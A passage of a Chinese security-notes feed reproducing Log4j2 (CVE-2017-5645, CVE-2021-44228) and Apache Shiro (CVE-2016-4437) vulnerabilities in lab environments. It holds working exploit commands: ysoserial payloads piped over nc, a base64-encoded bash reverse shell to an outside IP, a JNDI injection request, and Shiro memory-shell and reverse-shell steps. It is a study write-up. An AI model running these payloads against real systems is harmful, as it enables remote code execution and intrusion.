punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">toURI</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span>\n</code></pre></div><ul>\n<li>Web工程web.xml配置监听及加载：</li>\n</ul>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code><span class=\"token comment\">&lt;!-- Web工程方式加载 --&gt;</span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>context-param</span><span class=\"token punctuation\">&gt;</span></span>  \n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-name</span><span class=\"token punctuation\">&gt;</span></span>log4jConfiguration<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-name</span><span class=\"token punctuation\">&gt;</span></span>  \n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-value</span><span class=\"token punctuation\">&gt;</span></span>classpath:log4j2.xml<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-value</span><span class=\"token punctuation\">&gt;</span></span>  \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>context-param</span><span class=\"token punctuation\">&gt;</span></span>  \n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>listener</span><span class=\"token punctuation\">&gt;</span></span>  \n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>listener-class</span><span class=\"token punctuation\">&gt;</span></span>org.apache.logging.log4j.web.Log4jServletContextListener<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>listener-class</span><span class=\"token punctuation\">&gt;</span></span>  \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>listener</span><span class=\"token punctuation\">&gt;</span></span> \n</code></pre></div><p>Log4j2中日志有六个级别（level）：</p>\n<ul>\n<li>trace：追踪，是最低的日志级别，相当于追踪程序的执行，一般不怎么使用</li>\n<li>debug：调试，一般在开发中，都将其设置为最低的日志级别</li>\n<li>info：信息，输出重要的信息，使用较多</li>\n<li>warn：警告，有些时候,虽然程序不会报错，但是还是需要告诉程序员的</li>\n<li>error：错误，这个在开发中也挺常用的</li>\n<li>fatal：严重错误，这个一旦发生，程序基本上也要停止了\n当日志级别设置为某个值的时候，低于它的日志信息将不会被记录，只有高于设置的级别的信息会被记录。</li>\n</ul>\n<h2>2. 部分历史漏洞演示</h2>\n<h3>2.1 Log4j2 反序列化命令执行漏洞（CVE-2017-5645）</h3>\n<p>（1）漏洞介绍</p>\n<p>攻击者可以通过发送一个特别制作的二进制payload，在组件将字节反序列化为对象时，触发并执行构造的payload代码。</p>\n<p>该漏洞主要是由于在处理ObjectInputStream时，接收器对于不可靠来源的input没有过滤。可以通过给TcpSocketServer和UdpSocketServer添加可配置的过滤功能以及一些相关设置，可以有效的解决该漏洞。目前Log4j官方已经发布新版本修复了该漏洞。</p>\n<p>影响版本：Log4j&lt;2.8.2</p>\n<p>（2） 漏洞原理</p>\n<p>Demo环境（为了漏洞复现成功，添加一条 <strong>commons-collections</strong> 的 <strong>Gadget</strong>）</p>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependencies</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token comment\">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.apache.logging.log4j<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>log4j-core<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>2.8.1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token comment\">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.apache.logging.log4j<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>log4j-api<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>2.8.1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token comment\">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>commons-collections<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>commons-collections<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>3.1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependencies</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>然后写一个main函数，在8888端口起一个接收数据的SocketServer</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>logging<span class=\"token punctuation\">.</span>log4j<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStreamLogEventBridge</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>logging<span class=\"token punctuation\">.</span>log4j<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TcpSocketServer</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Log4jSocketServer</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">TcpSocketServer</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">&gt;</span></span> myServer <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n            myServer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TcpSocketServer</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token number\">8888</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStreamLogEventBridge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        myServer<span class=\"token punctuation\">.</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>只需要将反序列化后的payload发送给这个端口，</p>\n<figure><figcaption>image-20230713154838259</figcaption></figure>\n<p>第一个断点处，等待接收socket数据；</p>\n<p>第二个断点处，将接收到的数据转换成<strong>ObjectInputStream</strong> 对象数据；</p>\n<p>最终在 <code>handler.start()</code> 中调用<strong>SocketHandler</strong> 类的 <strong>run</strong> 方法。</p>\n<figure><figcaption>image-20230713155351255</figcaption></figure>\n<p>在 <strong>SocketHandler</strong> 类的 <strong>run</strong> 方法中， <strong>ObjectInputStream</strong>对象数据被传入了 <strong>ObjectInputStreamLogEventBridge</strong> 类的 <strong>logEvents</strong>方法，而反序列化就发生在这个方法中。</p>\n<figure><figcaption>image-20230713155701764</figcaption></figure>\n<p>就是这样。</p>\n<p>（3）漏洞利用</p>\n<blockquote>\n<p>本地环境漏洞利用：</p>\n</blockquote>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>java -jar ysoserial-all.jar CommonsCollections3 calc &gt;&gt; payload.bin\ncat payload.bin | nc 127.0.0.1 8888\n</code></pre></div><blockquote>\n<p>vulhub靶场环境，使用工具ysoserial</p>\n</blockquote>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>java -jar ysoserial-all.jar CommonsCollections5 \"touch /tmp/success\" | nc 192.168.1.189 4712\n\n</code></pre></div><figure><figcaption>image-20230712163753249</figcaption></figure>\n<figure><figcaption>image-20230712163807743</figcaption></figure>\n<h3>2.2 Log4j2 JNDI注入漏洞（CVE-2021-44228）</h3>\n<p>（1）漏洞介绍</p>\n<p>漏洞影响版本为2.0~2.14.1。</p>\n<p>2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞，在 12 月 9 日被国外有人公开 POC，从而导致了一波安全从业人员的疯狂运动，甲方安全从业者加班加点修复漏洞；白帽子们疯狂扫描漏洞并提交 SRC，一度导致一些 SRC 发布公告暂停接收相关漏洞；而黑灰产们已经在自己的挖矿勒索武器库上增加了该漏洞的利用模块。为什么会这么疯狂？</p>\n<p>漏洞触发及其简单，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>漏洞刚爆出时受影响的组件：\nSpring-Boot-strater-log4j2\nApache Struts2\nApache Solr\nApache Flink\nApache Druid\nElasticSearch\nFlume\nDubbo\nRedis\nLogstash\nKafka\nvmvare\n</code></pre></div><p>此漏洞影响广泛，开源组件中有近两万项目使用该存在漏洞的模块，绝对是目前为止影响最为广泛的漏洞，堪比之前出现的 heartbleed（心脏滴血）漏洞。比如 vmvare 的公告：https://www.vmware.com/security/advisories/VMSA-2021-0028.html</p>\n<p>至漏洞爆发开始，为了体现该漏洞的影响，甚至有了漏洞打地球的趣图，详情参考《<a href=\"https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247496216&amp;idx=1&amp;sn=2c85e1ad985e8a37c5ec2b7a5bded7cd&amp;scene=21#wechat_redirect\" target=\"_blank\" rel=\"noopener noreferrer\">核弹级漏洞公开，昨晚你睡着了么？</a>》，除了文中的还有入侵汽车、借用 WIFI 名称钓鱼的，从线上到线下广泛应用：</p>\n<p>大量网站存在这个问题，比如百度：</p>\n<figure><figcaption>640</figcaption></figure>\n<p>ICloud：</p>\n<figure><figcaption>icloud</figcaption></figure>\n<figure><figcaption>jingdong</figcaption></figure>\n<p>（2）漏洞原理</p>\n<p>关于log4j2的lookup功能</p>\n<p>https://logging.apache.org/log4j/2.x/manual/lookups.html</p>\n<p>日志在打印时当遇到 <code>${</code> 后，Interpolator 类以 <code>:</code> 号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p>\n<p>调用堆栈如下：</p>\n<figure><figcaption>image-20230714093554406</figcaption></figure>\n<p>关键点：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>LOGGER.error\n  ......\n    MessagePatternConverter.format\n      ....\n        StrSubstitutor.resolveVariable\n          Interpolator.lookup\n            JndiLookup.lookup\n              JndiManager.lookup\n                InitialContext.lookup\n\n</code></pre></div><ul>\n<li><strong>MessagePatternConverter.format</strong></li>\n</ul>\n<p>poc代码中的LOGGER.error()方法最终会调用到MessagePatternConverter.format()方法，该方法对日志内容进行解析和格式化，并返回最终格式化后的日志内容。当碰到日志内容中包含<code>${</code>子串时，调用StrSubstitutor进行进一步解析。</p>\n<figure><figcaption>image-20230714093902104</figcaption></figure>\n<ul>\n<li><strong>StrSubstitutor.resolveVariable</strong></li>\n</ul>\n<p>StrSubstitutor将<code>${</code>和<code>}</code>之间的内容提取出来，调用并传递给Interpolator.lookup()方法，实现Lookup功能。</p>\n<figure><figcaption>image-20230714094046558</figcaption></figure>\n<ul>\n<li><strong>Interpolator.lookup</strong></li>\n</ul>\n<p>Interpolator实际是一个实现Lookup功能的代理类，该类在成员变量strLookupMap中保存着各类Lookup功能的真正实现类。Interpolator对 上一步提取出的内容解析后，从strLookupMap获得Lookup功能实现类，并调用实现类的lookup()方法。</p>\n<p>例如对poc例子中的jndi:ldap://10.89.17.243:1389/Basic/Command/Base64/Y2FsYw==解析后得到jndi的Lookup功能实现类为JndiLookup，并调用JndiLookup.lookup()方法。\n</p>\n<ul>\n<li><strong>JndiLookup.lookup</strong></li>\n</ul>\n<p><code>JndiLookup.lookup()</code>方法调用<code>JndiManager.lookup()</code>方法</p>\n<figure><figcaption>image-20230714095658156</figcaption></figure>\n<p>获取JNDI对象后，调用该对象上的<code>toString()</code>方法，最终返回该字符串。</p>\n<figure><figcaption>image-20230714094925609</figcaption></figure>\n<ul>\n<li><strong>JndiManager.lookup</strong></li>\n</ul>\n<p><code>JndiManager.lookup()</code>较为简单，直接委托给<code>InitialContext.lookup()</code>方法。这里单独提到该方法，是因为后续几个补丁中较为重要的变更即为该方法。</p>\n<figure><figcaption>image-20230714095048611</figcaption></figure>\n<p>（3） 漏洞利用</p>\n<blockquote>\n<p><strong>环境1：vulfocus/log4j2-cve-2021-44228:latest</strong></p>\n</blockquote>\n<p>反弹shell命令如下：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>bash -i &gt;&amp; /dev/tcp/100.1.1.169/1245 0&gt;&amp;1\n</code></pre></div><p>将其base64编码</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDAuMS4xLjE2OS8xMjQ1IDA+JjE=\n</code></pre></div><p>先用JNDI注入工具起RMI或ldap，具体命令如下：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDAuMS4xLjE2OS8xMjQ1IDA+JjE=}|{base64,-d}|{bash,-i}\" -A 100.1.1.169\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[ADDRESS] &gt;&gt; 100.1.1.169\n[COMMAND] &gt;&gt; bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDAuMS4xLjE2OS8xMjQ1IDA+JjE=}|{base64,-d}|{bash,-i}\n\n</code></pre></div><figure><figcaption>image-20230711141952152</figcaption></figure>\n<p>选择一个payload复制，放入burpsuite的如下报文中（需要URL编码），发送给目标主机：</p>\n<div class=\"language-http\" data-ext=\"http\" data-title=\"http\"><pre class=\"language-http\"><code><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/hello?payload=%24%7b%6a%6e%64%69%3a%72%6d%69%3a%2f%2f%31%30%30%2e%31%2e%31%2e%31%36%39%3a%31%30%39%39%2f%71%7a%74%73%39%63%7d%20</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">192.168.1.189:52721</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">en-US,en;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">6</span></span>\n\n</code></pre></div><p>反弹shell成功</p>\n<figure><figcaption>image-20230711142555507</figcaption></figure>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "Shiro介绍及漏洞复现",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/shiro/shiro.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/shiro/shiro.html",
      "summary": "Shiro介绍及漏洞复现\n1. shiro简介\n1.1 shiro是什么\n权限管理框架，实现用户认证、用户授权。\nimage-20230510160216954image-20230510160216954\nSubject：主体；代表了当前“用户”，这个用户不一定是一个具体的人，与当前应用交互的任何东西都是Subject，如网络爬虫，机器人等；即一个抽...",
      "content_html": "\n<h2>1. shiro简介</h2>\n<h3>1.1 shiro是什么</h3>\n<p>权限管理框架，实现用户认证、用户授权。</p>\n<figure><figcaption>image-20230510160216954</figcaption></figure>\n<p><strong>Subject：主体</strong>；代表了当前“用户”，这个用户不一定是一个具体的人，与当前应用交互的任何东西都是Subject，如网络爬虫，机器人等；即一个抽象概念；所有Subject 都绑定到SecurityManager，与Subject的所有交互都会委托给SecurityManager；可以把Subject认为是一个门面；SecurityManager才是实际的执行者；</p>\n<p><strong>SecurityManager：安全管理器</strong>；即所有与安全有关的操作都会与SecurityManager 交互；且它管理着所有Subject；可以看出它是Shiro 的核心，它负责与后边介绍的其他组件进行交互，如果学习过SpringMVC，你可以把它看成DispatcherServlet前端控制器；</p>\n<p><strong>Realm：域</strong>；Shiro从从Realm获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm获取相应的用户进行比较以确定用户身份是否合法；也需要从Realm得到用户相应的角色/权限进行验证用户是否能进行操作；可以把Realm看成DataSource，即安全数据源。</p>\n<h3>1.2 基本功能点</h3>\n<figure><figcaption>企业微信截图_20230511133512</figcaption></figure>\n<ul>\n<li>Authentication：身份认证 / 登录，验证用户是不是拥有相应的身份；</li>\n<li>Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情</li>\n<li>常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限；</li>\n<li>Session Management：会话管理，即用户登录后就是一次会话，在没有退出之前，它的所有信息都在会话中；会话可以是普通 JavaSE 环境的，也可以是如 Web 环境的；</li>\n<li>Cryptography：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储；</li>\n<li>Web Support：Web 支持，可以非常容易的集成到 Web 环境；</li>\n<li>Caching：缓存，比如用户登录后，其用户信息、拥有的角色 / 权限不必每次去查，这样可以提高效率；</li>\n<li>Concurrency：shiro 支持多线程应用的并发验证，即如在一个线程中开启另一个线程，能把权限自动传播过去；</li>\n<li>Testing：提供测试支持；</li>\n<li>Run As：允许一个用户假装为另一个用户（如果他们允许）的身份进行访问；</li>\n<li>Remember Me：记住我，这个是非常常见的功能，即一次登录后，下次再来的话不用登录了</li>\n</ul>\n<h3>1.3 简单Demo演示</h3>\n<p>项目1：shiroDemo  自定义realm实现登录和鉴权</p>\n<p>项目2：SpringBoot整合Shiro</p>\n<figure><figcaption>image-20230511151917585</figcaption></figure>\n<h2>2. shiro漏洞举例</h2>\n<h3>2.1 shiro-550</h3>\n<p><strong>Shiro&lt;=1.2.4</strong> 反序列化漏洞（CVE-2016-4437）</p>\n<p><strong>漏洞原理</strong></p>\n<p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。Shiro 1.2.4及之前的版本中，在服务端对rememberMe的cookie值，先base64解码然后AES解密（加密密钥硬编码），最后反序列化（未作过滤处理），就导致了反序列化RCE漏洞。AES加密的密钥默认硬编码在代码里（<a href=\"https://issues.apache.org/jira/browse/SHIRO-550\" target=\"_blank\" rel=\"noopener noreferrer\">SHIRO-550</a>）。</p>\n<p>有很多开源的项目内部集成了shiro并二次开发，可能会重现低版本shiro的默认固定密钥风险。例如开发者在使用shiro时通常会找一些教程来帮助快速搭建，针对教程中自定义的密钥未修改就直接copy过来的情况也比较常见。<a href=\"https://github.com/stylefeng/Guns\" target=\"_blank\" rel=\"noopener noreferrer\">Guns开源框架</a>内部集成了shiro并进行二次开发，作者自定义密钥并固定，此时用户若不对密钥进行修改，即使升级shiro版本，也依旧存在固定密钥的风险。(相关issues地址https://github.com/stylefeng/Guns/issues/48)</p>\n<p><strong>源码分析</strong></p>\n<p>下载代码：<a href=\"https://github.com/godzeo/shiro/_1.2.4/_sample.git\" target=\"_blank\" rel=\"noopener noreferrer\">https://github.com/godzeo/shiro_1.2.4_sample.git</a></p>\n<p>分析结果：<code>org/apache/shiro/web/mgt/CookieRememberMeManager.java</code>继承了<code>org/apache/shiro/mgt/AbstractRememberMeManager.java</code>，如下：</p>\n<figure><figcaption></figcaption></figure>\n<p>先序列化，再AES加密，其中加密使用了密钥硬编码。</p>\n<p>然后在<code>org/apache/shiro/web/mgt/CookieRememberMeManager.java</code>的<code>rememberSerializedIdentity()</code>中进行base64编码，并通过response返回。</p>\n<figure><figcaption></figcaption></figure>\n<p>解密过程是先base64解码—AES解密—反序列化。所以可以通过构造cookie进行反序列化攻击。</p>\n<p>针对公开的密钥集合，我们可以在github上搜索到并加以利用。后面要用到的工具就收集了这些公开密码进行爆破。</p>\n<p>我们如何获知选择的密钥是否与目标匹配呢？当密钥不正确或类型转换异常时，目标Response包含<code>Set-Cookie：rememberMe=deleteMe</code>字段，而当密钥正确且没有类型转换异常时，返回包不存在<code>Set-Cookie：rememberMe=deleteMe</code>字段。</p>\n<p>参考：https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</p>\n<p>https://zeo.cool/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B%EF%BC%9A</p>\n<p><strong>漏洞复现</strong></p>\n<p>判断是否存在漏洞，随意输入用户名和密码点击登录并抓包：</p>\n<figure><figcaption>img8</figcaption></figure>\n<p>在请求包的Cookie中为?rememberMe字段赋任意值，收到返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段，说明目标有使用Shiro框架，可以进一步测试。</p>\n<figure><figcaption>img7</figcaption></figure>\n<p>漏洞利用工具：https://github.com/SummerSec/ShiroAttack2</p>\n<p>先爆破密钥：</p>\n<figure><figcaption>img6</figcaption></figure>\n<p>爆破利用链及回显：</p>\n<figure><figcaption>img5</figcaption></figure>\n<p>利用可行的利用链注入蚁剑内存马：</p>\n<figure><figcaption>img3</figcaption></figure>\n<p>蚁剑连接：</p>\n<figure><figcaption>img4</figcaption></figure>\n<p>工具2：https://github.com/zhzyker/shiro-1.2.4-rce</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python3 shiro-1.2.4_rce.py http://IP:PORT \n</code></pre></div><figure><figcaption>img11</figcaption></figure>\n<p>如图中一样手动输入系统类型linux或windows</p>\n<figure><figcaption>img10</figcaption></figure>\n<p>出现shell&gt;&gt;以后，攻击机开启nc监听。</p>\n<p>在shell&gt;&gt;处填写bash反弹shell命令<code>bash -i &gt;&amp; /dev/tcp/攻击机ip/端口 0&gt;&amp;1</code></p>\n<figure><figcaption>img9</figcaption></figure>\n<p>反弹shell成功。</p>\n<h3>2.2 shiro-721</h3>\n<p>Shiro Padding Oracle 远程命令执行漏洞（CVE-2019-12422）</p>\n<p><strong>漏洞背景</strong></p>\n<p>此处想要深入理解，需要学习一下AES加密，参考https://townmacro.cn/2022/09/06/%E6%B5%85%E8%AF%95%E6%8E%A2%E7%A9%B6shiro-721/</p>\n<p><strong>漏洞原理</strong></p>\n<p>Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，在后续的版本更新中，修复了之前shiro-550的固定KEY值，要求开发者自己设置，如果开发者没有设置，则默认动态生成一个KEY，降低了固定密钥泄漏的风险。然后后续的流程还是没变， <strong>1.2.5 &lt;= Shiro &lt; 1.4.2</strong>版本中仍然存在类似的漏洞，即shiro-721。</p>\n<p>在cookie中使用的是AES-128-CBC模式进行的加密，在加密流程中使用了Padding填充，这里导致用户可以通过Padding Oracle攻击来生成攻击代码来构造恶意的rememberMe字段，然后触发反序列化攻击，最终导致的任意代码执行。</p>\n<figure><figcaption>企业微信截图_20230515164522</figcaption></figure>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>1. 明文经过填充后，分为不同的组block，以组的方式对数据进行处理 \n2. 初始化向量（IV）首先和第一组明文进行XOR（异或）操作，得到”中间值“\n3. 采用密钥对中间值进行块加密，删除第一组加密的密文 （加密过程涉及复杂的变换、移位等） \n4. 第一组加密的密文作为第二组的初始向量（IV），参与第二组明文的异或操作  \n5. 